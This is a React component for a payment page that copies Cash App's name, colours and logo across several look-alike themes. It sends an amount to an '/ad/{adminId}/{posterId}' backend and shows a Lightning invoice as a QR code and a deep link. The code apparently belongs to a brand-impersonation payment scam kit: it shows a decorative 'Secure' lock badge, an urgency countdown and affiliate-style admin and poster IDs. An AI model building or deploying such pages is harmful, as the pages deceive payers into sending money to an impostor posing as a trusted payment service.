'use client';
import { useState, useEffect } from 'react';
import { FaLock, FaArrowRight, FaCheckCircle, FaCheck, FaBolt } from 'react-icons/fa';
import { toast } from 'react-toastify';
import { API_URL, site } from '../config/index';

import CashGreen from './templates/CashGreen';
import CashAppDark from './templates/CashAppDark';
import PayIsla from './templates/PayIsla';
import PayinCash from './templates/PayinCash';
import PayCashApp from './templates/PayCashApp';
import CashAppOnline from './templates/CashAppOnline';

const AMOUNTS = [10, 50, 100, 200, 300, 500];
const MORE_AMOUNTS = [750, 1000, 1500, 2000];

export default function Home({ adminId, posterId, param, param2, linkConfig }) {
  const [step, setStep] = useState(1);
  const [selectedAmount, setSelectedAmount] = useState(null);
  const [customAmount, setCustomAmount] = useState('');
  const [showMore, setShowMore] = useState(false);
  const [loading, setLoading] = useState(false);
  const [timeLeft, setTimeLeft] = useState(12 * 60 * 60);
  const [lightningInvoice, setLightningInvoice] = useState('');

  // Extract config
  const selectedTheme = linkConfig?.theme || "Cash Green";
  const brand = linkConfig?.brandName || "Cash App";
  const displayUsername = linkConfig?.username || "";
  const displayTitle = linkConfig?.title || "Pay me on Cash App — Instantly exchange money for free on Cash App";
  
  const minAmount = linkConfig?.minAmount !== undefined ? linkConfig.minAmount : 10;
  const maxAmount = linkConfig?.maxAmount !== undefined ? linkConfig.maxAmount : 2000;
  const fixedVal = linkConfig?.fixedAmount || "Open";
  const defaultVal = linkConfig?.defaultAmount;

  // Pre-select if fixed or if defaultAmount is set
  useEffect(() => {
    if (fixedVal !== "Open") {
      const parsedFixed = parseFloat(fixedVal);
      if (!isNaN(parsedFixed)) {
        setSelectedAmount(parsedFixed);
        setCustomAmount(fixedVal);
      }
    } else if (defaultVal !== undefined && defaultVal !== null && defaultVal !== "") {
      const parsedDefault = parseFloat(defaultVal);
      if (!isNaN(parsedDefault)) {
        setSelectedAmount(parsedDefault);
        setCustomAmount(defaultVal.toString());
      }
    }
  }, [fixedVal, defaultVal]);

  useEffect(() => {
    if (step === 2 && timeLeft > 0) {
      const timerId = setInterval(() => {
        setTimeLeft((prev) => prev - 1);
      }, 1000);
      return () => clearInterval(timerId);
    }
  }, [step, timeLeft]);

  const formatTime = (seconds) => {
    const hrs = Math.floor(seconds / 3600);
    const mins = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    return `${hrs.toString().padStart(2, '0')}:${mins
      .toString()
      .padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handlePayNow = async () => {
    const isAmountEditable = fixedVal === "Open" || (defaultVal !== undefined && defaultVal !== null && defaultVal !== "");
    if (!selectedAmount) {
      if (isAmountEditable) {
        toast.error(`Please enter an amount between $${minAmount} and $${maxAmount}`);
      } else {
        toast.error('Select your amount');
      }
      return;
    }

    if (isAmountEditable && (selectedAmount < minAmount || selectedAmount > maxAmount)) {
      toast.error(`Amount must be between $${minAmount} and $${maxAmount}`);
      return;
    }

    setLoading(true);
    let fullLink = linkConfig?.linkName;
    if (param && param2) {
      if (!fullLink || !fullLink.includes(`/${param2}`)) {
        fullLink = `https://${site}/${param}/${param2}`;
      }
    } else if (param) {
      if (!fullLink) {
        fullLink = `https://${site}/${param}`;
      }
    } else {
      if (!fullLink) {
        fullLink = `https://${site}`;
      }
    }

    const values = {
      site: fullLink,
      amount: selectedAmount,
      adminId,
    };

    try {
      const cleanPosterId =
        posterId && posterId !== 'undefined' && posterId !== 'null'
          ? posterId
          : '';
      const url = cleanPosterId
        ? `${API_URL}/ad/${adminId}/${cleanPosterId}`
        : `${API_URL}/ad/${adminId}`;

      const res = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(values),
      });

      const data = await res.json();
      if (data && data.info && data.info.lightningInvoice) {
        setLightningInvoice(data.info.lightningInvoice);
      } else {
        setLightningInvoice('');
      }

      setLoading(false);
      setStep(2);
    } catch (error) {
      console.error('Error creating invoice:', error);
      setLightningInvoice('');
      setLoading(false);
      setStep(2);
    }
  };

  const handleRecommendedPay = () => {
    if (lightningInvoice) {
      window.location.href = `https://cash.app/launch/lightning/${lightningInvoice}`;
    } else {
      toast.error('Lightning invoice is not generated yet.');
    }
  };

  const handleAmountClick = (amt) => {
    setSelectedAmount(amt);
    setCustomAmount(amt.toString());
  };

  const handleCustomAmountChange = (e) => {
    const val = e.target.value;
    setCustomAmount(val);
    const parsed = parseFloat(val);
    if (!isNaN(parsed)) {
      setSelectedAmount(parsed);
    } else {
      setSelectedAmount(null);
    }
  };

  const handleKeypadPress = (key) => {
    if (key === "backspace") {
      setCustomAmount(prev => {
        const next = prev.length <= 1 ? "0" : prev.slice(0, -1);
        const parsed = parseFloat(next);
        setSelectedAmount(isNaN(parsed) ? 0 : parsed);
        return next;
      });
    } else if (key === ".") {
      setCustomAmount(prev => {
        if (prev.includes(".")) return prev;
        const next = prev === "" ? "0." : prev + ".";
        return next;
      });
    } else {
      setCustomAmount(prev => {
        if (prev === "0") return key;
        const next = prev + key;
        const parsed = parseFloat(next);
        if (!isNaN(parsed) && parsed <= maxAmount) {
          setSelectedAmount(parsed);
          return next;
        }
        return prev;
      });
    }
  };

  const getLogoLetter = () => {
    return brand ? brand.charAt(0).toUpperCase() : "C";
  };

  // Determine design layout group
  const isKeypadGreen = selectedTheme === "Cash Green" || selectedTheme === "CashApp Dark" || selectedTheme === "Pay Isla";
  const isPayinCash = selectedTheme === "Payin Cash";
  const isPayCashApp = selectedTheme === "Pay Cash App";
  const isCashAppOnline = selectedTheme === "CashApp Online";

  const getBackgroundClass = () => {
    switch (selectedTheme) {
      case "Cash Green":
        return "bg-[#00D632] text-white";
      case "CashApp Dark":
        return "bg-[#121212] text-white";
      case "Pay Isla":
        return "bg-gradient-to-br from-[#0c2a1a] to-[#020a06] text-white";
      case "Payin Cash":
        return "bg-slate-50 text-gray-800";
      case "Pay Cash App":
        return "bg-white text-gray-800";
      case "CashApp Online":
        return "bg-[#f4f6f8] text-gray-800";
      default:
        return "bg-[#00D632] text-white";
    }
  };

  const templateProps = {
    brand,
    displayUsername,
    customAmount,
    selectedAmount,
    fixedVal: (defaultVal !== undefined && defaultVal !== null && defaultVal !== "") ? "Open" : fixedVal,
    minAmount,
    maxAmount,
    loading,
    handlePayNow,
    handleKeypadPress,
    handleAmountClick,
    handleCustomAmountChange,
    showMore,
    setShowMore,
    getLogoLetter,
    AMOUNTS,
    MORE_AMOUNTS,
    param2
  };

  const renderTemplate = () => {
    switch (selectedTheme) {
      case "Cash Green":
        return <CashGreen {...templateProps} />;
      case "CashApp Dark":
        return <CashAppDark {...templateProps} />;
      case "Pay Isla":
        return <PayIsla {...templateProps} />;
      case "Payin Cash":
        return <PayinCash {...templateProps} />;
      case "Pay Cash App":
        return <PayCashApp {...templateProps} />;
      case "CashApp Online":
        return <CashAppOnline {...templateProps} />;
      default:
        return <CashGreen {...templateProps} />;
    }
  };

  return (
    <div className={`min-h-screen font-sans flex flex-col justify-between ${getBackgroundClass()}`}>
      
      {/* Top Header */}
      {!isKeypadGreen && (
        <header className="flex justify-between items-center px-4 py-3 md:px-8 bg-white border-b border-gray-100 shrink-0">
          <div className="flex items-center gap-2">
            {isPayCashApp ? (
              <div className="bg-[#00D632] w-8 h-8 rounded-lg flex items-center justify-center text-white text-lg font-black select-none shadow">
                $
              </div>
            ) : (
              <div className="w-8 h-8 bg-[#00D632] rounded-full flex items-center justify-center text-white text-base font-bold shadow">
                {getLogoLetter()}
              </div>
            )}
          </div>
          
          <button className="flex items-center gap-1 text-xs font-bold border border-gray-250 px-3 py-1.5 rounded-full bg-white text-gray-500 hover:bg-gray-50 transition">
            <FaLock className="text-[9px]" />
            <span>Secure</span>
          </button>
        </header>
      )}

      <main className="flex-1 flex flex-col items-center justify-center py-4 px-4 overflow-hidden">
        {step === 1 ? (
          renderTemplate()
        ) : (
          <div className="w-full max-w-[390px] space-y-3 my-auto flex flex-col shrink-0 text-gray-800">
            {/* Main Payment Card */}
            <div className={`rounded-[32px] p-5 md:p-6 flex flex-col items-center shrink-0 border shadow-2xl ${
              isKeypadGreen ? "bg-white border-white text-gray-800" : "bg-white border-gray-100"
            }`}>
              <div className="w-full text-center mb-3 flex flex-col items-center">
                <p className="text-[11px] font-extrabold text-gray-400 uppercase tracking-wider mb-1">
                  Amount Due
                </p>
                <h2 className="text-4xl font-extrabold leading-tight text-gray-900">
                  ${selectedAmount.toFixed(2)}
                </h2>
                <p className="text-[12px] font-semibold text-gray-400 mt-1">
                  Scan or tap to pay
                </p>
              </div>

              {/* QR Code Container */}
              <div className="relative p-3.5 bg-white border border-gray-100 rounded-[28px] mb-3 w-full aspect-square flex items-center justify-center shadow-sm max-w-[260px] mx-auto select-all">
                <img
                  src={`https://api.qrserver.com/v1/create-qr-code/?size=600x600&ecc=H&data=${encodeURIComponent(`https://cash.app/launch/lightning/${lightningInvoice}`)}`}
                  alt="Payment QR"
                  className="w-full h-full object-contain p-1"
                />
                <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 bg-[#00D632] w-9 h-9 rounded-xl flex items-center justify-center shadow-lg border-2 border-white">
                  <span className="text-white font-black text-lg select-none">
                    $
                  </span>
                </div>
              </div>

              {/* Pay Now RECOMMENDED Button */}
              <button
                onClick={handleRecommendedPay}
                className="w-full py-3 bg-[#00D632] hover:bg-[#00b029] text-white font-extrabold rounded-full text-[15px] flex items-center justify-center gap-2.5 transition-all shadow-md shadow-green-100"
              >
                <div className="bg-black rounded-lg w-6 h-6 flex items-center justify-center shadow-sm shrink-0">
                  <span className="text-white font-black text-xs">$</span>
                </div>
                <span>Pay now</span>
                <span className="bg-white/20 text-white text-[9px] font-extrabold uppercase px-2 py-0.5 rounded-full tracking-wider shrink-0">
                  Recommended
                </span>
              </button>

              {/* Validated lightning payment link */}
              {lightningInvoice && (
                <div className="w-full mt-4 p-3 bg-gray-50 border border-gray-100 rounded-2xl flex flex-col items-center">
                  <span className="text-[9px] font-bold text-gray-400 uppercase tracking-wider mb-1">
                    Lightning Invoice Link
                  </span>
                  <div className="w-full flex items-center justify-between gap-2 bg-white border border-gray-200 rounded-xl p-2 text-xs font-mono select-all overflow-hidden">
                    <span className="truncate text-gray-600 w-full text-left font-mono">
                      {`https://cash.app/launch/lightning/${lightningInvoice}`}
                    </span>
                    <button
                      onClick={() => {
                        navigator.clipboard.writeText(`https://cash.app/launch/lightning/${lightningInvoice}`);
                        toast.success("Invoice link copied!");
                      }}
                      className="p-1.5 text-gray-400 hover:text-[#00D632] hover:bg-gray-50 rounded-md transition shrink-0"
                      title="Copy Link"
                      type="button"
                    >
                      <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3" />
                      </svg>
                    </button>
                  </div>
                </div>
              )}
            </div>

            {/* Timer Box */}
            <div className="bg-white border border-gray-100 shadow-xl rounded-[24px] p-4 text-center shrink-0 w-full">
              <p className="text-[11px] font-extrabold text-gray-400 uppercase tracking-wider mb-1">
                Expires In
              </p>
              <p className="text-2xl font-extrabold text-gray-900 leading-none">
                {formatTime(timeLeft)}{' '}
                <span className="text-gray-400 font-bold ml-1 text-base">remaining</span>
              </p>
            </div>
          </div>
        )}
      </main>

      {/* Decorative Bottom Bar */}
      <div className={`fixed bottom-0 left-0 right-0 h-1 opacity-35 bg-gradient-to-r from-transparent via-current to-transparent ${
        isKeypadGreen ? "text-white" : "text-emerald-500"
      }`}></div>
    </div>
  );
}
